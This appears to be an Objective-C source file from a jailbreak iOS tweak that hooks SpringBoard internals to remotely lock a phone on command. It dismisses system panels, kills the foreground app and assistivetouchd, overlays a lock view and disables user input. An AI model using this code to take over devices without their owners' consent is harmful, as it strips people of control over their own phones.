//
//  DeviceLockManagerUtils.m
//  MSLOCK
//
//  Created by Benjawan Tanarattanakorn on 6/20/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <objc/runtime.h>

#import "DeviceLockManagerUtils.h"
#import "MessagePortIPCReader.h"
#import "DefStd.h"
#import "DeviceLockUtils.h"
#import "SBUIController.h"
#import "SBAwayController.h"
#import "SharedFileIPC.h"
#import "AlertLockStatus.h"
#import "SBApplicationController.h"
#import "SBApplication.h"
#import "SpringBoard.h"
#import "DaemonPrivateHome.h"
#import "PrefEmergencyNumber.h"
#import "UICreator.h"

#import "SBControlCenterController.h"
#import "SBNotificationCenterController.h"
#import "SBLockScreenManager.h"
#import "SBBacklightController.h"

static DeviceLockManagerUtils *_DeviceLockManagerUtils = nil;


@interface DeviceLockManagerUtils (private)
- (void)				initializeLockView;
- (void)				injectLockViewToSpringBoardWindow;
- (AlertLockStatus *)	getLockStatus;
id						getInstanceVariable(id x, NSString * s);
void					setInteraction (BOOL allow, UIView* aView); // disable user interaction on a view and its subviews
@end


@implementation DeviceLockManagerUtils

@synthesize mAlertLockStatus;
@synthesize mLockView;

+ (id) sharedDeviceLockManagerUtils {
	if (_DeviceLockManagerUtils == nil) {
		_DeviceLockManagerUtils = [[DeviceLockManagerUtils alloc] init];
	}
	return (_DeviceLockManagerUtils);
}

- (id) init {
	self = [super init];
	if (self != nil) {
		mIsDeviceLockNow = NO;
	}
	return self;
}


#pragma mark -
#pragma mark Lock and Unlock

/**
 - Method name:		lockScreenAndSuspendKeys 
 - Purpose:			1) This results in disabling lock button, menu button, volume button
					2) inject the lock screen to SpringBoard's window									
 - Arg(s):			none
 - Return:			none
 */
- (void) lock {
	DLog (@"locking ...")		
	if (!mIsDeviceLockNow) {
		DLog (@"can lock ...")
		mIsDeviceLockNow = YES;
		
		DLog (@"[START] locking the device");
        
        
        // -- (iOS 7) While the screen is off, undim the screen. Otherwise, the screen never turn on because we block all the hardware button while the device is lock
        SBBacklightController *sharedSBBacklightController = [objc_getClass("SBBacklightController") sharedInstance];
        DLog(@"screenIsOff %d", [sharedSBBacklightController screenIsOff])
        if (sharedSBBacklightController         && [sharedSBBacklightController screenIsOff]) {
            [sharedSBBacklightController _undimFromSource:0];
        }

        // -- (iOS 7) Dismiss Control Center (This feature is introduced in iOS 7)
        SBControlCenterController *sharedSBControlCenterController = [objc_getClass("SBControlCenterController") sharedInstance];
        DLog(@"-- Dismiss Control Center SBControlCenterController isPresented %d", [sharedSBControlCenterController isPresented])
        if (sharedSBControlCenterController     && [sharedSBControlCenterController isPresented])
            [sharedSBControlCenterController controlCenterViewControllerWantsDismissal:YES];
        
        // -- (iOS 7) Dissmiss Notification Plane
        SBNotificationCenterController *sharedSBNotificationCenterController = [objc_getClass("SBNotificationCenterController") sharedInstance];
        DLog(@"-- Dissmiss Notification Plane Notification isPresented %d", [sharedSBNotificationCenterController isVisible])
        if (sharedSBNotificationCenterController && [sharedSBNotificationCenterController isVisible])
            [sharedSBNotificationCenterController dismissAnimated:YES];
        
		// -- (iOS 6) Unlock iphone's lock screen
		SBAwayController *sharedAwayController = [objc_getClass("SBAwayController") sharedAwayController];
		[sharedAwayController unlockWithSound:YES];
		DLog (@"Unlock with sound YES");
        
        // -- (iOS 7) Unlock iphone's lock screen
        SBLockScreenManager *sharedSBLockScreenManager = [objc_getClass("SBLockScreenManager") sharedInstance];
      	DLog(@"-- Unlock iPhone Lockscreen sharedSBLockScreenManager %@ isUILocked %d",
             sharedSBLockScreenManager,
             [sharedSBLockScreenManager isUILocked])
        // the number 8 is got fromhooking the normal behavior of swiping to unlock
        [sharedSBLockScreenManager startUIUnlockFromSource:8 withOptions:nil];
        //[sharedSBLockScreenManager _setUILocked:0];

		UIApplication *uiApplication = [objc_getClass("UIApplication") sharedApplication];
		
		// -- kill foreground app
		[(SpringBoard *)uiApplication quitTopApplication:nil];
		DLog (@"Quit top application");
		
		// -- hide status bar of SpringBoard application
		[(SpringBoard *)uiApplication hideSpringBoardStatusBar];
		DLog (@"Hide springboard status bar");
		
		// -- inject lock view
		[self initializeLockView];
		[self performSelector:@selector(injectLockViewToSpringBoardWindow) withObject:nil afterDelay:1];
		DLog (@"Initialize lock view plus delay injection lock view to springboard window");
		
		// -- disable user interaction of window
		SBUIController *sbUIController	= [objc_getClass("SBUIController") sharedInstance];
		UIWindow *_window				= getInstanceVariable(sbUIController, @"_window");
		setInteraction(NO, _window);							
		//	[uiApplication setStatusBarHidden:YES];			/// !!! this is required to disable SBSetting action (swipe status bar to bring up its application)
		DLog (@"[DONE] locking the device ...");
                
        system("killall assistivetouchd");
	} else {
		DLog (@"can not lock ...")	
		UICreator *uiCreator = [UICreator sharedUICreator];
		[uiCreator updateUserText:[mAlertLockStatus mDeviceLockMessage]	forView:mLockView];
	}
}

/**
 - Method name:		lockScreenAndSuspendKeys 
 - Purpose:			1) This results in enabling lock button, menu button, volume button
					2) remove the lock screen frome SpringBoard's window						
 - Arg(s):			none
 - Return:			none
 */
- (void) unlock {
	DLog (@"unlocking ...")
	
	if (mIsDeviceLockNow) {
		DLog (@"can unlock ...")
		mIsDeviceLockNow = NO;
		
		// -- remove the lock screen
		[mLockView removeFromSuperview];		
		[mLockView release];
		mLockView = nil;
		
		// -- enable user interaction of window
		SBUIController *sbUIController = [objc_getClass("SBUIController") sharedInstance];
		UIWindow *_window = getInstanceVariable(sbUIController, @"_window");		
		setInteraction(YES, _window);
		
		// -- show status bar
		UIApplication *uiApplication = [objc_getClass("UIApplication") sharedApplication];	// Disable user interaction on StatusBar
		[(SpringBoard *)uiApplication showSpringBoardStatusBar];
		//[uiApplication setStatusBarHidden:NO];
	}
}

/**
 - Method name:		checkPreviousLockStateAndKeepLockOrUnlockDevice 
 - Purpose:			read AlertLockStatus from DB
 - Affected ins. var.:	"mAlertLockStatus"
 - Arg(s):			none
 - Return:			none
 */
- (void) checkPreviousLockStateAndKeepLockOrUnlockDevice {
	DLog(@"------------------------------------------------------------------------")
	DLog(@"			checkPreviousLockStateBeforeRespringOrReboot        ")
	DLog(@"------------------------------------------------------------------------")
	AlertLockStatus *alertLockStatus = [self getLockStatus];
	
	if (alertLockStatus) {			
		DLog(@">>>>>>>>>>> previous state: %d, %@", [alertLockStatus mIsLock], [alertLockStatus mDeviceLockMessage]);
		[self setMAlertLockStatus:alertLockStatus];
		
		// -- perform lock/unlock device according to the previous state
		if ([mAlertLockStatus mIsLock] == YES) {
			mIsDeviceLockNow = NO;					/// !!! set to make lock method can be performed
			[self lock];
		} else if ([mAlertLockStatus mIsLock] == NO) {
			mIsDeviceLockNow = YES;					/// !!! set to make unlock method can be performed
			[self unlock];
		} else {
			DLog (@">>>>>>>>>>> command and DB is NOT SYNCED")
		}
	} else {
		DLog(@">>>>>>>>>>> no kSharedFileAlertLockID in DB");
		alertLockStatus = [[AlertLockStatus alloc] initWithLockStatus:NO deviceLockMessage:@""];
		[self setMAlertLockStatus:alertLockStatus];
		[alertLockStatus release];
		alertLockStatus = nil;
	}	
}

/**
 - Method name:		initializeLockView 
 - Purpose:			instantiate lock view
 - Affected ins. var.:	"mLockView"
 - Arg(s):			none
 - Return:			none
 */
- (void) initializeLockView {
	// -- Create lock screen
	DLog (@"Initialize lock view");
	if (!mLockView) {
		UICreator *uiCreator = [UICreator sharedUICreator];
		[uiCreator setMBundleName:[[self mAlertLockStatus] mBundleName]];
		[uiCreator setMBundleIdentifier:[[self mAlertLockStatus] mBundleIdentifier]];
		mLockView = [[uiCreator createLockScreenWithText:[mAlertLockStatus mDeviceLockMessage]] retain];	// retain
	}
}

/**
 - Method name:		injectLockViewToSpringBoardWindow 
 - Purpose:			inject lock view to SpringBaord window
 - Preriquisite:	"mLockView" is required instantiated
 - Arg(s):			none
 - Return:			none
 */
- (void) injectLockViewToSpringBoardWindow {
	DLog (@"Inject lock view to springboard window");
	SBUIController *sbUIController	= [objc_getClass("SBUIController") sharedInstance];
	UIWindow *_window				= getInstanceVariable(sbUIController, @"_window");
	[_window  addSubview:mLockView];
	[_window bringSubviewToFront:mLockView];
	
	setInteraction(NO, _window);
}

- (AlertLockStatus *) getLockStatus {
	NSFileManager *fm = [NSFileManager defaultManager];
	NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
	NSString *sharedFilePath = [privateHome stringByAppendingString:@"sharesipc/"];
	NSString *sharedFileFullPath = [sharedFilePath stringByAppendingString:kSharedFileMobileSubstrate1];
	
	AlertLockStatus *alertLockStatus = nil;
	if ([fm fileExistsAtPath:sharedFileFullPath]) {
		DLog(@">>>>>>>>>>>>>>>>>>>>>>> database ALREADY exists")
		
		SharedFileIPC *shareFileIPC			= [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate1];
		NSData *alertLockStatusData			= [shareFileIPC readDataWithID:kSharedFileAlertLockID];	
		[shareFileIPC release];	
		shareFileIPC = nil;
		
		
		if (alertLockStatusData) {				// kSharedFileAlertLockID exists in DB
			alertLockStatus	= [[AlertLockStatus alloc] initFromData:alertLockStatusData];
			[alertLockStatus autorelease];
			DLog(@">>>>>>>>>>> previous state: %d, %@", [alertLockStatus mIsLock], [alertLockStatus mDeviceLockMessage]);
		} else {
			alertLockStatus = nil;
			DLog(@">>>>>>>>>>> no kSharedFileAlertLockID in DB");
		}	
	} else {
		DLog(@">>>>>>>>>>>>>>>>>>>>>>> database NOT exists")
		
	}
	
	return alertLockStatus;
}

id getInstanceVariable(id x, NSString * s) {
    Ivar ivar = class_getInstanceVariable([x class], [s UTF8String]);
    return object_getIvar(x, ivar);
}

// disable user interaction on a view and its subviews
void setInteraction (BOOL allow, UIView* aView) {
	DLog(@"user interaction: %d", [aView isUserInteractionEnabled]);
    [aView setUserInteractionEnabled:allow];
	//    for (UIView * v in [aView subviews]) {
	//        setInteraction(allow, v);
	//    }
}

#pragma mark -
#pragma mark Message Port

- (void) startMessagePortReader {
	DLog (@"startMessagePortReader")
	if (!mMessagePortReader) {
		DLog(@"create message port reader")
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kAlertMessagePort 
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
}

- (void) stopMessagePortReader {
	DLog (@"stopMessagePortReader")
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}
}

/**
 - Method name:		dataDidReceivedFromSocket 
 - Purpose:			Callback function when data is received via message port	
 - Affected ins. var.:	mAlertLockStatus
 - Arg(s):			aRawData, the received data
 - Return:			none
 */
- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog (@">>>>>>>>>>>>>>>> data did receive")
	AlertCommand alertCommand;
	[aRawData getBytes:&alertCommand length:sizeof(NSInteger)];
	
	DLog (@"AlertCommand %d", alertCommand)
	
	// -- read AlertLockStatus from DB
	SharedFileIPC *shareFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate1];
	NSData *alertLockStatusData = [shareFileIPC readDataWithID:kSharedFileAlertLockID];	
	[shareFileIPC release];	
	shareFileIPC = nil;
	AlertLockStatus *alertLockStatus = nil;
	if (alertLockStatusData) {
		alertLockStatus = [[AlertLockStatus alloc] initFromData:alertLockStatusData];
		[alertLockStatus autorelease];
		DLog(@"alertLockStatus %d", [alertLockStatus mIsLock])
	} else {
		alertLockStatus = [[AlertLockStatus alloc] initWithLockStatus:NO deviceLockMessage:@""];
		[alertLockStatus autorelease];
	}
	
	// -- update lock status to ins. var. 
	[self setMAlertLockStatus:alertLockStatus];
	
	if (alertCommand == kAlertLock) {
		if ([mAlertLockStatus mIsLock] == YES) {
			DLog (@">>>>>>>>>>> command  is syned with DB: LOCK")
			[self lock];
		} else {
			DLog (@">>>>>>>>>>> command and DB is NOT SYNCED")
		}
	} else if (alertCommand == kAlertUnlock) {
		if ([mAlertLockStatus mIsLock] == NO) {
			DLog (@">>>>>>>>>>> command is syned with DB: LOCK")
			[self unlock];
		} else {
			DLog (@">>>>>>>>>>> command and DB is NOT SYNCED")
		}
	} else {
		DLog(@"invalid command")
	}
}

/*
 // not used
 - (void) bringLockViewToFront {
 DLog(@">>>>>>>>>>>> bringLockViewToFront")
 [mLockView removeFromSuperview];	
 [self injectLockViewToSpringBoardWindow];
 }
 */

/*
 // not used
 - (void) setLatestActivatedApplication: (SBApplication *) aSbApp {
 NSString *bundleID = getInstanceVariable(aSbApp, @"_bundleIdentifier");
 DLog(@">>>>>>>>>> latested activated app: %@", bundleID)
 mLatestActivatedApplicationName = bundleID;
 }
 */

- (void) dealloc {
	[self stopMessagePortReader];
	if (mAlertLockStatus) {
		[mAlertLockStatus release];
		mAlertLockStatus = nil;
	}
	if (mLabel) {
		[mLabel release];
		mLabel = nil;
	}
	if (mLockView) {
		[mLockView release];
		mLockView = nil;
	}
	[super dealloc];
}

@end
